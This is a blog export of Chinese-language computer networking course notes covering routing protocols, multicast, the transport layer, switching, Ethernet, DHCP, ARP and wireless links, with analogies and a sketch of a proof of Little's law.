<h2 id="4-6-域内路由-amp-域间路由"><a href="#4-6-域内路由-amp-域间路由" class="headerlink" title="4.6 域内路由 &amp; 域间路由"></a>4.6 域内路由 &amp; 域间路由</h2><p>RIP: routing information protocol 路由选择信息协议，基于 DV</p>
<p>OSPF: open shortest path first 开放最短路优先，基于 LS</p>
<p>BGP: broder gateway protocol 边界网关协议</p>
<p>ASN: AS number 自治系统号</p>
<p>stub: 桩网络，可以理解为用户，只负责收和发自己的包，不负责帮别人路由</p>
<p>IGP:<br>RIP:</p>
<ul>
<li>每 30s 发送一条 RIP 响应报文，超过 180s 没收到邻居的信息就默认邻居挂了，将该信息传递给其他邻居</li>
<li>通过 UDP 端口号 520 发 RIP 请求和响应，因为 RIP 是作为一个进程（应用层）来运作的</li>
</ul>
<p>OSPF:</p>
<ul>
<li>至少 30min 向区域内所有路由器广播链路状态</li>
<li>生成一棵以自己为根的最短路径树</li>
<li>将一个 AS 分成多个块</li>
</ul>
<p>BGP: (use TCP)<br>eBGP, iBGP</p>
<p>假设我是 AS3<br>AS-PATH: 指出要到达 x，需要经过 AS2 AS1<br>NEXT-HOP: 指出要到达 x，经过的 AS1 的网关路由器的 ip 是多少</p>
<p>向外网路由时，如果有多条路由，选择规则</p>
<ul>
<li>每条路由有一个本地偏好值，取决于 AS 的网络管理员，最高偏好值的优先</li>
<li>接下来，最短 AS-PATH 的优先</li>
<li>MED，越小越好</li>
<li>接下来，热土豆策略，离哪个网关路由器的最短路径短就用哪个</li>
<li>接下来，BGP 标识符</li>
</ul>
<p>BGP 针对 DV 的修改：</p>
<ol>
<li>选择是最优路而不是最短路</li>
<li>使用 path-vector 而不是 distance vector</li>
<li>将自己可达的路由选择性地通告出去</li>
<li>BGP 可能会聚合地址，为了减少规模</li>
</ol>
<p>Gao-Rexford rules:</p>
<ul>
<li>用户的出路由可以被发给任何人</li>
<li>peer 的出路由发给用户</li>
<li>provider 的出路由发给用户</li>
</ul>
<h2 id="4-7-广播"><a href="#4-7-广播" class="headerlink" title="4.7 广播"></a>4.7 广播</h2><p>RPF: reverse path forwarding 反向路径转发</p>
<p>RPF</p>
<ul>
<li>转发报文，仅当上一跳位于自己到源点的最短路径上</li>
</ul>
<p>广播的三种方法：</p>
<ul>
<li>洪泛</li>
<li>受控洪泛<ul>
<li>序号控制洪泛，维护已收到的[源地址, 序列号]</li>
<li>RPF 反向路径转发，利用生成树</li>
</ul>
</li>
<li>生成树广播<ul>
<li>选定中心，其他节点向中心单播路由</li>
<li>一旦遇到中心或树上的节点，就把这条路嫁接到生成树上</li>
</ul>
</li>
</ul>
<p>实际中的</p>
<ul>
<li>Gnutella<ul>
<li>16bit 标识符+16bit有效载荷描述符，监测这个包是不是被收到复制转发了</li>
<li>ttl 限制跳的范围，每次-1，再转发</li>
</ul>
</li>
<li>OSPF 的 LSA<ul>
<li>32bit 序号+16bit 年龄，年龄每次转发+1，等待洪泛也会+1</li>
</ul>
</li>
</ul>
<h2 id="4-7-多播"><a href="#4-7-多播" class="headerlink" title="4.7 多播"></a>4.7 多播</h2><p>DVMRP: distance vector multicast routing protocol 距离向量多播路由选择协议</p>
<p>PIM: protocol independent multicast 协议无关的路由选择协议</p>
<p>DVMRP</p>
<ul>
<li>基于剪枝的 RPF</li>
</ul>
<p>PIM</p>
<ul>
<li>稠密模式，大多数路由器参与到多播中，类似 DVMRP</li>
<li>稀疏模式，仅允许单一发送方向多播树中发送流量</li>
</ul>
<p>IGMP 协议号 2</p>
<p>IGMP:</p>
<ul>
<li>membership_query 路由器向主机周期性发送(想加入吗？/你还在吗？)</li>
<li>membership_report 主机(主动/收到query后)请求加入多播组</li>
<li>leave_group 主机礼貌地退出多播组</li>
</ul>
<p>多播路由算法</p>
<ul>
<li>一棵共享树，类似多播的生成树广播</li>
<li>以每个发送方为源，建树，然后用 RPF 进行多播<ul>
<li>稍作修改，如果某个路由器（叶子路由器）发现自己的主机都不在多播组，则向上一级汇报一个剪枝报文</li>
<li>如果某个路由器（非叶子路由器）的所有子孙路由器都汇报了剪枝，那么它就向上一级汇报一个剪枝</li>
</ul>
</li>
</ul>
<h1 id="IP-vs-MAC-addr"><a href="#IP-vs-MAC-addr" class="headerlink" title="IP vs MAC addr"></a>IP vs MAC addr</h1><p>MAC:</p>
<ul>
<li>硬编码</li>
<li>48bits</li>
<li>可移动，与位置无关</li>
<li>用来在同一网络下传送包</li>
<li>地址是平坦的</li>
<li>forwarding table 由数据包生成，自学习</li>
<li>“路由”协议计算无环拓扑</li>
</ul>
<p>IP:</p>
<ul>
<li>动态配置</li>
<li>32/128bits</li>
<li>与主机的位置有关</li>
<li>用来在IP子网下传送包</li>
<li>地址是聚合的</li>
<li>forwarding table 由路由协议计算</li>
<li>路由协议计算最短路径</li>
</ul>
<h1 id="第3章-运输层"><a href="#第3章-运输层" class="headerlink" title="第3章 运输层"></a>第3章 运输层</h1><p>多路分解：从网络中收集数据传（分解）给不同套接字<br>多路复用：把多个套接字的数据都（复用）交给网络</p>
<p>0-1023 周知端口<br>HTTP: 80<br>FTP: 21</p>
<h2 id="3-3-UDP"><a href="#3-3-UDP" class="headerlink" title="3.3 UDP"></a>3.3 UDP</h2><p>使用原因：</p>
<ol>
<li>简洁化运输，精细的问题交给应用层</li>
<li>无需握手</li>
<li>无需维护连接状态</li>
<li>首部开销小</li>
</ol>
<p>应用</p>
<ul>
<li>RIP 路由表更新</li>
<li>DNS 查询</li>
</ul>
<h2 id="3-4-可靠数据传输原理"><a href="#3-4-可靠数据传输原理" class="headerlink" title="3.4 可靠数据传输原理"></a>3.4 可靠数据传输原理</h2><p>rdt: realiable data transfer 可靠数据传输</p>
<p>udt: unrealiable data transfer 不可靠数据传输</p>
<p>ARQ: automatic repeat request 自动重传请求，发 ACK/NACK 的</p>
<p>GBN: go back N 回退 N 步</p>
<p>SR: selective repeat 选择重传</p>
<p>停等协议：没收到 ack/nack 就不能从上层接受新数据</p>
<h2 id="3-5-TCP"><a href="#3-5-TCP" class="headerlink" title="3.5 TCP"></a>3.5 TCP</h2><p>MSS: maximum segment size 最大报文段（应用层数据）长度，通常为 1500-20-20 = 1460 byte</p>
<p>EstimateRTT = (1-a)<em>EstimateRTT + a </em>SampleRTT</p>
<p>DevRTT = (1-b)<em>DevRTT + b </em>|sample - estimate|</p>
<p>a 推荐 0.125<br>b 推荐 0.25</p>
<p>TimeoutInterval = estimate + 4* dev</p>
<p>推荐初值为 1 s</p>
<p>TCP 流量控制</p>
<ul>
<li>在报文中包括 rwnd</li>
<li>当 rwnd 为 0 时，对面主机也不会停，防止短暂时间后缓冲区清空但发送方被阻塞的情况</li>
</ul>
<p>拥塞控制类别</p>
<ul>
<li>端到端拥塞控制 (TCP)</li>
<li>网络辅助的拥塞控制 (ATM ABR)</li>
</ul>
]]></content>
      <categories>
        <category>Computer Network</category>
      </categories>
      <tags>
        <tag>Computer Network</tag>
      </tags>
  </entry>
  <entry>
    <title>计网学习笔记</title>
    <url>/2019/02/25/%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>计算机网络（Computer Network）复习笔记</p>
<p>参考书目：《计算机网络自顶向下方法（第5版）》机械工业出版社</p>
<h1 id="CH1-Introduction-of-Networking-1"><a href="#CH1-Introduction-of-Networking-1" class="headerlink" title="CH1-Introduction of Networking-1"></a>CH1-Introduction of Networking-1</h1><h2 id="杂记："><a href="#杂记：" class="headerlink" title="杂记："></a>杂记：</h2><p>CN负责数字通信（数字信号）</p>
<p>哈罗车筐前黑色是太阳能板？</p>
<p>宿舍-一层-一楼-学校网络中心-南京教育网（东大）-全国教育网</p>
<p>第一台联网计算机在UCLA</p>
<p>remote medicine 瓶颈在于时延</p>
<p>行星间联网，光速瓶颈</p>
<p>因特网是一个复杂系统，分解为<strong>5个子问题</strong>，谁来分解？如何分解？</p>
<hr>
<h2 id="课程主要讲述："><a href="#课程主要讲述：" class="headerlink" title="课程主要讲述："></a>课程主要讲述：</h2><ol>
<li>因特网如何工作？</li>
<li>子问题为什么这样解决？</li>
</ol>
<h2 id="讲解顺序："><a href="#讲解顺序：" class="headerlink" title="讲解顺序："></a>讲解顺序：</h2><ol>
<li>基础：包、链路、复用、时延、丢包</li>
<li>低级技术：以太网，无线局域网，3g，4g</li>
<li>IP，路由，BGP</li>
<li>网络互通后如何交换信息：DNS,CDN,HTTP,TCP</li>
<li>热点问题：数据中心、</li>
</ol>
<h2 id="课程任务："><a href="#课程任务：" class="headerlink" title="课程任务："></a>课程任务：</h2><ol>
<li>实验25%（现场提问，验收，改代码，严格）</li>
<li>作业15%</li>
<li>期末考试60%</li>
</ol>
<hr>
<h2 id="交换方式"><a href="#交换方式" class="headerlink" title="交换方式"></a>交换方式</h2><ol>
<li>电路交换：最基础的交换方式。点对点<br> 特点：<ol>
<li>中间所有资源都预留好</li>
<li>admission control per connection</li>
</ol>
</li>
<li>包交换：大家都把数据分为小数据包，一股脑发到交换机，交换机再转发，自由竞争，冲突了就丢一个，一个小包失败了就再发一次。（核心思想：统计复用）<br> 特点：<ol>
<li>包独立处理</li>
<li>admission control per packet</li>
</ol>
</li>
<li>虚链路：在包交换中模拟电路交换给vip用户优先权，以便冲突时优先满足vip用户</li>
</ol>
<hr>
<h2 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h2><p>电路交换：在两点之间建立通道，src和dst之间直接连接（中间类似于多刀多掷开关）</p>
<p>建链-传输-拆链。想象成老电影里的电话局，处长和局长通话需要接线员接线、通话、拔线。</p>
<p>时间分片：比如，将1ms分为1000片，1000个用户同话，用户1通话时只占用1ms的第1片，然后若干个1ms组成了通话时间。如果有人通话量大，就多分几片。</p>
<p>频率分片：将频率切片，比如1Mhz的一段切成100片分给不同的用户，实际上要分很多级/空间复用，不然没法满足几亿用户的分配需求，频率之间不干扰，频率由国家法律严格控制，比如联通被分在800-850Mhz。</p>
<p>低频波的波长长，容易绕开障碍物。所以停用2G用户，这样子那一段频率就可以用来给5G了。</p>
<p>1G频分，2G时分，后面的利用更高级原理。</p>
<p><img src="/2019/02/25/计网学习笔记/" alt="电路交换的时序图1"></p>
<p><strong>为什么建链时有delay，拆链时没有delay？</strong><br>因为建链时，需要预留电路，要时间，可能会失败。拆链直接拆就行。</p>
<p><img src="/2019/02/25/计网学习笔记/" alt="电路交换的时序图2"></p>
<p>传输data时，不一定是连续的，不传输的时候就浪费了。比如2G/3G时代的手机QQ，发一个消息要建链-拆链一次，电费消耗大。在传大文件或者看电影才划算。</p>
<p><strong>优点：</strong></p>
<ol>
<li>predictable performance（保证一定送到，速度也有保障）</li>
<li>simple/fast switching (once circuit established)（建链后很简单）</li>
</ol>
<p><strong>缺点：</strong></p>
<ol>
<li>complexity of circuit setup/teardown（建链和拆链很麻烦）</li>
<li>inefficient when traffic is bursty（上述手机QQ的浪费、驿站的一匹马只运输一串荔枝，但实际上可以驼很多东西，这些空间浪费了。）</li>
<li>circuit setup adds delay（建链需要一来一回，增加时延，聊微信会很花时延）</li>
<li>switch fails-&gt;circuit fails（建链失败就完蛋）</li>
</ol>
<p>相似工作原理：华为手机之所以省电，在于有1个主CPU和几个小CPU，微信等通过小CPU。天线也是自己开屏幕才会工作，所以微信可能会收到不及时。</p>
<hr>
<h2 id="包交换"><a href="#包交换" class="headerlink" title="包交换"></a>包交换</h2><p>包交换：通信时像快递一样，只要写好每个数据包发货地址和收货地址，交换机只要负责查地址，就可以发了。核心思想是<code>统计复用</code>。</p>
<p>不保证性能：如果一大堆人同时发包，只能送一个，其他丢掉。或者用一个buffer缓存一下，再发。</p>
<p><strong>优点：</strong></p>
<ol>
<li>Efficient use of network resources</li>
<li><strong>simpler to implement</strong>（要求交换机做的事情很少，复杂的事交给端系统完成，就很便宜）</li>
<li>robust: can “route around trouble”（不存在链路建立失败的问题，比如一家快递倒闭了我换一家就可以了）</li>
</ol>
<p><strong>缺点：</strong></p>
<ol>
<li>unpredictable performance（由于buffer容量有限，只能保证大部分快递不送丢，类比双11快递公司的爆仓）</li>
<li>requires buffer management and congestion control（需要管理仓库和拥塞控制，管理仓库是这个快递费20，那个快递费5块，冲突就丢掉5块的。拥塞控制是双11短期取货码（被动，拥塞已经发生）、提前两三周开始双11（主动从源头控制）、南大驿站装不下就返回到上一级驿站）</li>
</ol>
<h2 id="统计复用-statistical-multiplexing"><a href="#统计复用-statistical-multiplexing" class="headerlink" title="统计复用 statistical multiplexing"></a>统计复用 statistical multiplexing</h2><p>Allowing more demands than the network can handle.</p>
<ul>
<li><p>hoping that not all demands are required at the same time（小区接入宽带，允许10个用户100M，但只给他们分配100M，因为假定他们不会同时用网，且一家人用不了100M。）（旅馆也住不了那么多人，正常情况下不会这么多人同时去住，如果想专享线路，建个行宫吧）</p>
</li>
<li><p>results in unpredictability（世界杯期间突然爆满）</p>
</li>
<li><p>works well except for the extreme cases（爆满的情况不符合统计复用的条件）</p>
</li>
</ul>
<h2 id="如何评价网络性能"><a href="#如何评价网络性能" class="headerlink" title="如何评价网络性能"></a>如何评价网络性能</h2><ul>
<li>时延delay</li>
<li>丢包率loss</li>
<li>吞吐量throughput（速率）</li>
</ul>
<p>无线网络侧重于丢包率</p>
<p>数据中心侧重时延</p>
<h3 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h3><p>Consists</p>
<ul>
<li>transmission delay (link，取决于带宽，$数据量/带宽$)</li>
<li>propagation delay (link，取决于路长，$长度/光速$)</li>
<li>queueing delay<br>(取决于来的包，冲突就进队列，队列溢出就丢掉，由于包有编号，接收端数一数123457，丢了6号，那么通知发送方重发)(按均值和variance来衡量，由排队论设计好)（数据中心的主要时延）（平均排队时长）<blockquote>
<p>Littes’s law(1961)<br>L = A * W</p>
</blockquote>
</li>
<li>processing delay (有但可以忽略不计了，和电子工业发展有关) </li>
</ul>
<p>链路带宽bandwidth：八车道的八（同时有几个比特在链路里跑）</p>
<p>BDP = Bandwidth * propagation delay</p>
<p>$1G=10^9$</p>
<p>对于小文件，$D_{prop}$占主导，对于大文件，$D_{trans}$占主导时延</p>
<p>普通交换机遵循store-forward模式，交换机收到包先存起来解析包头再发下一站。<br>端(trans,prop,queue&amp;process)交换机()交换机()端</p>
<p>高频交换机（高频率股票交易）不遵循上述模式<br>带宽极高不用queue，收到1bit就直接发。</p>
<h3 id="丢包loss"><a href="#丢包loss" class="headerlink" title="丢包loss"></a>丢包loss</h3><h3 id="吞吐率throughput"><a href="#吞吐率throughput" class="headerlink" title="吞吐率throughput"></a>吞吐率throughput</h3><p>transmission rate R bits/sec</p>
<p>file of size F bits<br>packets of size L bits</p>
<p>Transfer time(T) = F/R + propagation delay</p>
<p>木桶原理，端到端的速率取决于最细的那一段</p>
<h2 id="Little-laws的证明"><a href="#Little-laws的证明" class="headerlink" title="Little laws的证明"></a>Little laws的证明</h2><p>$<br>\begin{equation}<br>\lambda\overset{def}{=}\lim\limits_{t\to \infty} \frac{N(t)}{t}, \text{the arrival rate into the system}<br>\end{equation}<br>$</p>
<p>$<br>\begin{equation}<br>\omega\overset{def}{=}\lim\limits_{n\to \infty} \frac{1}{n}\sum\limits_{j=1}^{n}W_j, \text{average sojourn time}<br>\end{equation}<br>$</p>
<p>$<br>\begin{equation}<br>l\overset{def}{=}\lim\limits_{t\to \infty} {\frac{1}{t}\int_{0}^{t}L(s)ds}, \text{average number in system}<br>\end{equation}<br>$</p>
<p>$<br>L(t):\text{the total number of customers in the system at time t.}<br>$</p>
<p>$<br>N(t)=max\{n:t_n\leq t\}<br>$</p>
<p>$<br>L(t)=\sum\limits_{n=1}^{\infty}{I\{t_n\leq t\leq t_n^a\}}=<br>$</p>
<p>$<br>\frac{1}{t}\sum\limits_{j:t_j^{\alpha}\leq t}{W_j} \leq \frac{1}{t}\int_{0}^{t}{L(s)ds} \leq \frac{1}{t}\sum\limits_{j:t_j &lt; t}{W_j}<br>$</p>
<p>后者=$ \lim\limits_{t\to \infty} \frac{N(t)}{t} \frac{1}{N(t)}\sum\limits_{j=1}{N(t)}W_j $</p>
<p>Lemme: if $\lambda$ and $\omega$ exists and finite, then</p>
<script type="math/tex; mode=display">\lim\limits_{n\to \infty}{\frac{W_n}{n}=0}, \lim\limits_{n\to \infty}{\frac{W_n}{t_n}=0}</script><p>前者<img src="/2019/02/25/计网学习笔记/" alt="手机图片"></p>
<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>层与层之间没有耦合关系，所以更新时候方便。</p>
<p>OSI七层（L7应用层，L6表示层，L5会话层），TCP\IP五层</p>
<p>沙漏状的五层：（海淘）<br>应用层-CEO写的内容（确定到南大的哪个人）（千万种协议）<br>传输层-秘书（写美国哪个州哪个县）（TCP可靠，UDP不可靠）<br><strong>网络层-全球可达（only IP，基石）</strong><br>链路层-局部可达<br>物理层-计科不管</p>
<p>应用层-&gt;传输层，加header指明给对方的哪个进程<br>传输层-&gt;…，类似</p>
<p>端系统5层全要，中间的交换机只要下3层即可，负责信息的到达（联邦快递）。</p>
<p>传输层和网络层原本部署在 CPU 上，现在为了快速转到了网卡上。</p>
<p>pros:</p>
<ol>
<li>reduce complexity（分而治之）（负责分拣的就分拣，运货的就运货）</li>
<li>improve flexibility（每一层只对上层负责，内部实现可以改）（用飞机送和用马车送）</li>
</ol>
<p>cons:</p>
<ol>
<li>higher overheads（每一层的header，占总大小5%-8%）</li>
<li>cross-layer information often useful（上下层可以互相偷窥对方的内容，因为只是加了header）</li>
</ol>
<p>IP层不好改，打过了很多补丁。IPv4-&gt;IPv6的演进。就像给行驶中的高铁换轮子还不能让高铁发现。<br>IPv4是32bit的，所以它只能有4G个地址，不够用。</p>
<p><strong>End-to-end argument</strong><br>中间节点越简单越好，只负责转发就行了，复杂的事情交给终端。不然中间的设备太复杂成本高。</p>
<p>墙的效果：在物理层偷窥应用层，不符合要求就咔嚓</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>分层很棒</li>
<li>网络层最重要，将应用和底层完全隔离开</li>
<li>E2E arguments 激励我们 keep IP simple</li>
</ol>
<h1 id="第2章-链路层"><a href="#第2章-链路层" class="headerlink" title="第2章 链路层"></a>第2章 链路层</h1><p>术语<br>L3: packet<br>L2: frame</p>
<h3 id="data-link-layer-做的事："><a href="#data-link-layer-做的事：" class="headerlink" title="data link layer 做的事："></a>data link layer 做的事：</h3><ul>
<li>framing（将 L3 的 packet 封成 frame）</li>
<li>link access（宿舍四个人在使用同一个物理机，决定谁来用）</li>
<li>reliable delivery（应对错误和丢包丢 frame，用于无线网/基站通信，一个包发两次或者其他保护机制）</li>
<li>error detection and correction（包收到了，但内容不对，用校验码，纠错码）</li>
</ul>
<h3 id="传输方式："><a href="#传输方式：" class="headerlink" title="传输方式："></a>传输方式：</h3><ul>
<li>point to point（海底光缆，电话线，以太网-墙上的网口）</li>
<li>broadcast（无线局域网，不安全= =，几个人会同时讲话）</li>
</ul>
<h4 id="广播-broadcast"><a href="#广播-broadcast" class="headerlink" title="广播 broadcast"></a>广播 broadcast</h4><p>广播方式中，物理媒介是共享的，如何决定谁说话？</p>
<ul>
<li>channel partitioning: 切片，一人一片，类似电路交换，分频率，效率不高</li>
<li>taking turns: 轮流上</li>
<li>random access: 每个人想发就发，协议决定谁发（不避免 collision，而是解决 collision）（分布式）</li>
</ul>
<p>random access protocol(MAC)<br>do: <strong>detect and recover</strong> from collisions</p>
<p>所谓 protocol:</p>
<ul>
<li>pattern（先说一句hello）</li>
<li>senmatic（然后开始交流）</li>
</ul>
<h3 id="broadcast-Ethernet（老）"><a href="#broadcast-Ethernet（老）" class="headerlink" title="broadcast Ethernet（老）"></a>broadcast Ethernet（老）</h3><p>CD: collision detection</p>
<p>老的是 broadcast 方式，新的是网口直连交换机。</p>
<p>CSMA(carrier sense multiple access)<br>发之前监听一下，媒体空着我就说话，没空着我就等等再说<br>问题在于，有传播时延、还是有冲突没法消灭</p>
<p>CSMA/CD<br>limits:</p>
<ul>
<li>包的最小值</li>
<li>传输距离最大值</li>
</ul>
<p>原因：propagation delay</p>
<p>以太网最短帧限定 64bytes</p>
<p>Q: 冲突后 AB 都停止发送，何时重新开始？<br>AQ: 随机一段时间再发，随机多久？<br>A: binary exponential back-off（在小区间里取随机数，发，失败了就在更大区间里取随机数，重复，直到不拥塞）</p>
<p>CSMA/CD 效率<br>$ Efficiency \approx \frac{d_{trans}}{d_{trans}+5d_{prop}} $</p>
<h3 id="switched-Ethernet（新）"><a href="#switched-Ethernet（新）" class="headerlink" title="switched Ethernet（新）"></a>switched Ethernet（新）</h3><p>点到点，交换机判断 A 和 C 通信，那么 A 的消息就不往 B 和 D 发了。</p>
<h3 id="Ethernet"><a href="#Ethernet" class="headerlink" title="Ethernet"></a>Ethernet</h3><p>以太网协议除了帧格式没变，其他基本都变了，API 为帧格式。</p>
<p><img src="/2019/02/25/计网学习笔记/" alt="PPT图示以太网帧结构"></p>
<ul>
<li>preamble: 8 bytes 前导码，7用于时钟同步，1用于表示帧开始</li>
<li>address: 6 bytes，dst+source</li>
<li>type: 2 bytes，表明高层协议</li>
<li>data payload: max 1500, min 64 bytes</li>
<li>CRC: 4 bytes for error dectection</li>
</ul>
<p>Q: 如何决定帧在传输时，从何开始从何结束？<br>A1: 开头说明帧多长（弊端，可能会在传输中出错）<br>A2: 开头结尾加哨兵，比如0111110表示开头，01111111表示结尾（弊端，哨兵出现在 frame contents 中，提前结束）（解决方法：发送端向 frame contents 中加0，由网卡自动完成，接收端去0，使得哨兵不会出现在 contents 中）</p>
<p>MAC address（48 bit，二层地址，局部有效，身份证）<br>IP address（标识你在网络空间里的位置，邮政编码）</p>
<h3 id="路由-routing"><a href="#路由-routing" class="headerlink" title="路由 routing"></a>路由 routing</h3><h4 id="routing-with-broadcast-ethernet"><a href="#routing-with-broadcast-ethernet" class="headerlink" title="routing with broadcast ethernet"></a>routing with broadcast ethernet</h4><p>Q: 如何在广播以太网里路由？<br>A: 即插即用，都接在一根铜缆上</p>
<p>Q: 同一楼层用一根线，不同楼层<br>A: 用网桥 bridges，连接不同 LAN</p>
<p>broadcast storm 问题：假如不同 LANS 间有环路，信号永生，信号循环加强，gg</p>
<p>解决思路：无环路的连通图是树，给网络图找生成树，保留节点，去掉链路。</p>
<h5 id="spanning-tree-protocol"><a href="#spanning-tree-protocol" class="headerlink" title="spanning tree protocol"></a>spanning tree protocol</h5><p>nice properties:</p>
<ul>
<li>zero configuration（即插即用，自动配置）</li>
<li>self healing（坏了一台，可以迅速重新构建拓扑）</li>
</ul>
<h4 id="routing-with-switched-ethernet"><a href="#routing-with-switched-ethernet" class="headerlink" title="routing with switched ethernet"></a>routing with switched ethernet</h4><p>要求：即插即用</p>
<p>问题：依然存在广播数据包，交换机之间会有环<br>flooding 洪泛</p>
<h4 id="spaning-tree-算法"><a href="#spaning-tree-算法" class="headerlink" title="spaning tree 算法"></a>spaning tree 算法</h4><p>思想：</p>
<ol>
<li>pick a root（选一个 MAC 地址最小的作为 root，约定俗成）</li>
<li>计算其他节点到 root 的最短路，只保留最短路上的链路，多个最短路就选一条（比如选 MAC addr 最小的，约定俗成）</li>
</ol>
<p>算法内容：<br>[UST]见PPT</p>
<p>1次洪泛可以确定所有主机 MAC 地址、root 地址？<br>A 不知道 B 在哪时，就把 dst 设为全 f，总能传播到，路上的交换机也知道 A 在哪了，这样 B 再回个包就能顺利到 A</p>
<p>交换机干的事：</p>
<ol>
<li>看看 A 来的包以前来过没，没来过就加入 switch table</li>
<li>表里的项如果过了生存期还没有被使用，就删掉表项（原因：容量有限、A 可能会离开这片有线网）</li>
<li>收到单播数据包，当发现目标节点不认识时，就 forwarding</li>
</ol>
<h4 id="以太网-pros-and-cons"><a href="#以太网-pros-and-cons" class="headerlink" title="以太网 pros and cons"></a>以太网 pros and cons</h4><p>pros</p>
<ol>
<li>即插即用</li>
<li>自愈</li>
<li>便宜</li>
</ol>
<p>cons</p>
<ol>
<li>带宽浪费（spanning tree 把很多枝砍掉了）</li>
<li>重建 spanning tree 时的延迟（新插入节点的 id 是0，那么它会是新 root）</li>
<li>对付移动中的设备比较慢（云平台，虚拟机快速移动）</li>
<li>可预测性差（A 找 B 不知道找多久，但问题不大，因为很快）</li>
</ol>
<h3 id="即插即用咋实现的"><a href="#即插即用咋实现的" class="headerlink" title="即插即用咋实现的"></a>即插即用咋实现的</h3><p>Q: 一台主机来时，只有 MAC 地址，怎么知道 IP 地址，邮政编码？<br>A: ARP, DHCP protocol</p>
<p>功能：</p>
<ul>
<li>discovery of local end-host<ul>
<li>for communication between hosts on the same LAN</li>
</ul>
</li>
<li>bootstrap communication with remote hosts<br>  what is my<ul>
<li>IP addr</li>
<li>local DNS server</li>
<li>first hop router</li>
</ul>
</li>
</ul>
<h4 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h4><p>a host uses DHCP to discover</p>
<ul>
<li>IP addr</li>
<li>netmask</li>
<li>IP addr for its local DNS name server （没有DNS也能通信，直接输入 IP 地址就行，DNS 坏了表现为 www.baidu.com 上不去，但QQ（内置了对方IP地址）可以用）</li>
<li>IP addr for its fist-hop “default” router(s)</li>
</ul>
<p>过程如下：<br>一个 DHCP 服务器把 IP addr，DNS addr 都弄好<br>用户先用全 f 进行广播，所有的 DHCP 服务器（一个就能工作，多个为了鲁棒）回一个 offer<br>用户选择一个，发一个 request， DHCP 服务器回一个 ACK<br>然后就能用了</p>
<p>DHCP uses “soft state”（软状态就好比普通内存，得不停的刷它，不然比特会翻转，所以得一直耗电，硬状态好比固态硬盘，即使不给他电，比特也不会翻转）<br>一个用户比如12小时不继续申请，DHCP server 就收回 IP addr，适用于咖啡馆这类客户用会就走了<br>如果用户在到期前“续租”，配置不会改变，应用不会断（网上银行之类，换个 IP addr 就直接断开），如果过期后续租，IP addr 可能就改了</p>
<p>如果用户挂了，租约到期时 DHCP 回收回<br>如果 DHCP 挂了，租约到期前用户正常使用，到期后用户企图续租，但没人鸟他，该 IP addr 就没法用了<br>如果用户和 DHCP 之间的链路挂了，用户到期前正常，到期后找别的 DHCP 服务器</p>
<h4 id="ARP-DNS"><a href="#ARP-DNS" class="headerlink" title="ARP, DNS"></a>ARP, DNS</h4><p>假设我的 IP addr 为 1.2.3.53<br>掩码 netmask 是 1.2.3.0/24<br>DNS IP addr 为 1.2.3.156</p>
<ol>
<li>在网页浏览器输入 www.sina.com</li>
<li>浏览器一看，就去问 DNS，由于在以太网内，就要知道 DNS 的 MAC addr</li>
<li>怎么知道呢，在以太网内广播一次，就知道哪个 MAC addr 拥有 1.2.3.156 这个 IP addr（即使要通信10000次也只要广播一次就知道 MAC addr 了）</li>
<li>利用每个主机都有一张 ARP table，记录最近和本主机通信过的 <ip addr,="" mac="" addr=""></ip></li>
</ol>
<p>本地通信：<br>直接丢局域网就解决了（类似同一个宿舍传递毛巾）</p>
<p>远程通信：<br>丢到网关里，然后事情丢给网关（类似快递丢给快递员，怎么送我就不关心了）</p>
<p>远程通信的四大关键要素：<br>IP addr<br>netmask<br>DNS IP addr<br>Gateway IP addr</p>
<p>ARP 负责 链路层和网络层映射<br>DNS 负责 应用层和网络层映射</p>
<p>DNS 是一级级的，有南大级别的，教育网级别的，中国级别的…</p>
<h3 id="无线网络-WLAN"><a href="#无线网络-WLAN" class="headerlink" title="无线网络 WLAN"></a>无线网络 WLAN</h3><p>wireless != mobility</p>
<p>handoff: mobile changes base station providing connection into wired network（从南校门走到北校门，手机用的基站已经换了一个了）<br>5G 目标就是解决高铁高速移动中迅速切换基站</p>
<p>基站：<br>可以理解为连接无线和有线的，解决最后一公里问题。<br>部署在位置比较好的地方，铁塔公司把基站后连接有线连入因特网核心</p>
<p>无线链路：<br>按照目标来划分，目标有：通信距离</p>
<p>无线网络通信的两种方式</p>
<ol>
<li>infrastructure mode（一台通信车，其他人通过通信车进行通讯，通信车被炸了就没法通信了）</li>
<li>ad-hoc mode（每个人都是一个节点，能和其他人进行通信，挂了一个其他人不影响）</li>
</ol>
<p>single hop: 宿舍两个人手机通信，实际上 A-AP-B<br>multiple hop: MANET, VANET（车联网用的到，企图把道路上的一片区域的车组成小网络，防止碰撞）</p>
<p>无线连接的特征：</p>
<ol>
<li>decreased signal strength: 信号衰减<br> 自由路径损失公式<br> free space path loss(FSPL)<br> $ FSPL = (\frac{4\pi df}{c})^2 $<br> d = distance<br> $\lamda$ = wave length(c/f)<br> f = frequency<br> c = speed of light</li>
</ol>
<hr>
<p><strong>TODO:</strong><br>第5周周四的课补</p>
<hr>
<h1 id="第3章-网络层"><a href="#第3章-网络层" class="headerlink" title="第3章 网络层"></a>第3章 网络层</h1><h2 id="IP-Layer"><a href="#IP-Layer" class="headerlink" title="IP Layer"></a>IP Layer</h2><p>IP 包：IP header + 四层的 payload</p>
<p>IP 层只关心 header，类比快递员只关心快递盒子上贴了什么快递单</p>
<p>IP header 作为下两者的 interface：</p>
<ol>
<li>source and destination（发件人和收货人）</li>
<li>source and network（发件人和收货地址）</li>
</ol>
<h3 id="IP-协议设计时要完成的目标"><a href="#IP-协议设计时要完成的目标" class="headerlink" title="IP 协议设计时要完成的目标"></a>IP 协议设计时要完成的目标</h3><ol>
<li>解析包</li>
<li>传送包</li>
<li>处理第三层遇到的问题：<ol>
<li>routing 的死循环（类似二层交换机的死循环）</li>
<li>出错误</li>
<li>包太大</li>
</ol>
</li>
<li>协议可扩展</li>
<li>信息传递优先级（类似顺丰隔日达、今日达，只看你给钱多）</li>
</ol>
